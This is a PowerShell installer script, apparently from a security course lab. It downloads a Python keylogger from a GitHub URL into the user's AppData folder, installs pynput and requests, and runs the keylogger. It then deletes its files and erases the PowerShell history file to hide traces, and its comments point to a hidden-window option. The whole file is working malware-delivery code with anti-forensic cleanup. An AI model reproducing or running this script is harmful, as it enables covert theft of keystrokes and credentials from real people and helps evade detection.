# install_keylogger.ps1

# --- Configuration ---
$PythonKeyloggerUrl = "https://raw.githubusercontent.com/butlersl/305-lab-files/main/Keylogger/keylogger.py"

$KeyloggerFileName = "keylogger.py"
$TargetDir = Join-Path $env:APPDATA "Keylogger_App" # Use a slightly more descriptive name
$MainScriptPath = Join-Path $TargetDir $KeyloggerFileName

# --- Step 1: Create Target Directory ---
Write-Host "Creating target directory: $TargetDir"
try {
    New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
    Write-Host "Directory created successfully."
} catch {
    Write-Error "Failed to create directory '$TargetDir': $($_.Exception.Message)"
    exit 1
}

# --- Step 2: Download Python Keylogger Script ---
Write-Host "Downloading keylogger script from $PythonKeyloggerUrl..."
try {
    $httpClient = New-Object System.Net.Http.HttpClient
    # Set a reasonable timeout for the download
    $httpClient.Timeout = New-TimeSpan -Seconds 30
    $response = $httpClient.GetAsync($PythonKeyloggerUrl).Result
    $response.EnsureSuccessStatusCode() # Throws an exception for non-success status codes
    $scriptContent = $response.Content.ReadAsStringAsync().Result
    Set-Content -Path $MainScriptPath -Value $scriptContent -Encoding UTF8
    Write-Host "Keylogger script downloaded successfully to $MainScriptPath"
} catch {
    Write-Error "Failed to download keylogger script from '$PythonKeyloggerUrl': $($_.Exception.Message)"
    exit 1
}

# --- Step 3: Ensure Python is Available and Install Dependencies ---
Write-Host "Ensuring Python is available and installing dependencies..."

# Check if python is in PATH
$pythonPath = Get-Command python -ErrorAction SilentlyContinue
if (-not $pythonPath) {
    Write-Error "Python is not found in the system PATH. Please ensure Python is installed and added to PATH."
    exit 1
}
Write-Host "Python found at: $($pythonPath.Source)"

# Try to install pynput and requests
try {
    Write-Host "Installing required Python libraries (pynput, requests)..."
    # Using the found python executable explicitly
    & $pythonPath.Source -m pip install --upgrade pip # Ensure pip is up-to-date
    & $pythonPath.Source -m pip install pynput requests
    Write-Host "Python libraries installed/upgraded successfully."
} catch {
    Write-Warning "Failed to install Python libraries (pynput, requests). They might already be installed, or pip is not configured correctly. Error: $($_.Exception.Message)"
    # Continue, as they might already be installed. The Python script will error if they're missing.
}

# --- Step 4: Run the Keylogger ---
Write-Host "Executing the Python keylogger script: $MainScriptPath"
try {
    # Run the python script. We'll run it visibly for debugging.
    # For hidden execution, use -WindowStyle Hidden, but debugging is harder.
    # Using Start-Process allows us to potentially get the exit code.
    $process = Start-Process -FilePath $pythonPath.Source -ArgumentList $MainScriptPath -WindowStyle Normal -Wait -PassThru # -Wait makes PowerShell wait for Python to finish
    
    if ($process.ExitCode -ne 0) {
        Write-Error "Python script exited with an error code: $($process.ExitCode)"
        # You might want to examine the Python script's output if it was visible
    } else {
        Write-Host "Python script finished successfully."
    }
} catch {
    Write-Error "Failed to start or run the Python script '$MainScriptPath': $($_.Exception.Message)"
    exit 1
}

# --- Step 5: Cleanup (Optional - for demonstration only) ---
# In a real scenario, you'd want to be very careful with cleanup.
Write-Host "Starting cleanup process..."

# Remove the keylogger script and directory
Write-Host "Removing keylogger script and directory..."
try {
    Remove-Item -Path $TargetDir -Recurse -Force
    Write-Host "Cleanup of '$TargetDir' complete."
} catch {
    Write-Warning "Failed to remove directory '$TargetDir': $($_.Exception.Message)"
}

# Basic attempt to clear PowerShell history. This is not foolproof.
Write-Host "Attempting to clear PowerShell history..."
try {
    if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
        Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force
        Write-Host "PowerShell history cleared (basic attempt)."
    } else {
        Write-Host "PowerShell history file not found, skipping clear."
    }
} catch {
    Write-Warning "Failed to clear PowerShell history: $($_.Exception.Message)"
}

Write-Host "Script execution finished."
exit 0
